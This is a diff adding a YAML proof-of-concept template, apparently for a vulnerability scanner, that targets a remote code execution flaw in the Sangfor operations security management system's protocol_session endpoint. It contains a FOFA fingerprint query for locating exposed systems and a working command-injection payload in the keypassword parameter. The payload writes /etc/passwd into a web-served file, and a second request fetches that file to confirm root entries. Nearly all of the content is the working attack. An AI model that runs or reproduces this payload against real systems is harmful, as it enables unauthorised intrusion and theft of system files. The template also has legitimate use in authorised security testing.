@@ -1,0 +1,19 @@
+id: poc-yaml-sangfor-omsms-protocol-session-rce
+info:
+  name: 深信服运维安全管理系统 protocol_session 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 深信服运维安全管理系统
+  fofa: body="/fort/login" && header="FORTSESSIONID"
+variables:
+  t1: random_str(6)
+requests:
+- method: GET
+  path: /isomp-protocol/protocol/session?keyPath=/etc/passwd&protocol=ssh&keypassword=123456%27%3Bcat%20/etc/passwd+%3E%20/usr/local/tomcat/webapps/fort/trust/version/{{.t1}}.txt;&sshd=1
+  expression: status_code == 200 && matches(body,"[0-9a-fA-F]{8}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{12}")
+- method: GET
+  path: /fort/trust/version/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
